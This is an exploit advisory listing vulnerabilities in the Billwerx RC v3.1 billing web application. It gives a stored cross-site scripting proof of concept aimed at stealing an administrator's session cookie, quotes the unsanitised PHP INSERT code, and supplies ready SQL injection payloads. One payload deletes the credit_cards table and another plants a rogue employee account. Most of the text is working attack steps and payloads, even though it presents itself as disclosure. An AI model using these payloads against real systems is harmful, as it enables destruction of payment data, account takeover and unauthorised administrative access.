Billwerx RC v3.1 Multiple Vulnerabilities
=========================================

#################################################################
 
#
 
# Billwerx RC v3.1 Multiple Vulnerabilities
 
# Found By: mr_me
 
# Download: http://www.billwerx.com/download.php
 
# Tested On: Windows Vista
 
# Note: For educational purposes only
 
#
 
#################################################################
 
 
 
XSS POC:
 
 
 
A regular employee can embed javascript code that could be executed within the context of the admin&#039;s browser.
 
If the user edits their own profile by going to "http://[server]/billwerx_public_beta/employees/update_employee.php?employee_id=2"
 
and places "<script>alert(document.cookie)</script>"
 
into any of the following fields: &#039;firstname&#039;, &#039;billing address&#039;, &#039;billing city&#039;, &#039;billing province&#039;, &#039;billing postal&#039;, &#039;billing country&#039; and then gives the following link to the admin:
 
 
 
http://[server]/billwerx_public_beta/employees/update_employee.php?employee_id=2
 
 
 
The user could potentially log the admins cookie and reset their own session thus gaining administration access.
 
 
 
SQL Injection POC:
 
 
 
http://127.0.0.1/billwerx_public_beta/employees/company_files.php
 
 
 
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#039;1&#039;)&#039; at line 1
 
 
 
Here you can see in the code snip that the description post value is unsanitized.
 
 
 
8<-------------snip-------------8<
 
 
 
$description = strtolower($_POST[&#039;description&#039;]);
 
 
 
$employee_id = $_SESSION[&#039;employee_id&#039;];
 
 
 
$readfile = fopen($temp_name, &#039;r&#039;);
 
$content = fread($readfile, filesize($temp_name));
 
$content = addslashes($content);
 
fclose($readfile);
 
 
 
# Assign values to a database table:
 
$doSQL = "INSERT INTO company_files (name, size, type, content, public, description, employee_id) VALUES (&#039;$name&#039;, &#039;$size&#039;, &#039;$type&#039;, &#039;$content&#039;, &#039;$public&#039;, &#039;$description&#039;, &#039;$employee_id&#039;)";
 
 
 
8<-------------snip-------------8<
 
 
 
SQL Injection exploit:
 
 
 
&#039;,&#039;1&#039;); DELETE FROM credit_cards;/*
 
 
 
or
 
 
 
&#039;,&#039;1&#039;); insert into employees values (4, &#039;mr_me&#039;, &#039;hello&#039;, &#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;mr_me@hax0r.com&#039;, &#039;lol_mypassword&#039;, 0.00, 3, &#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;2009-07-28 10:47:59&#039;);/*



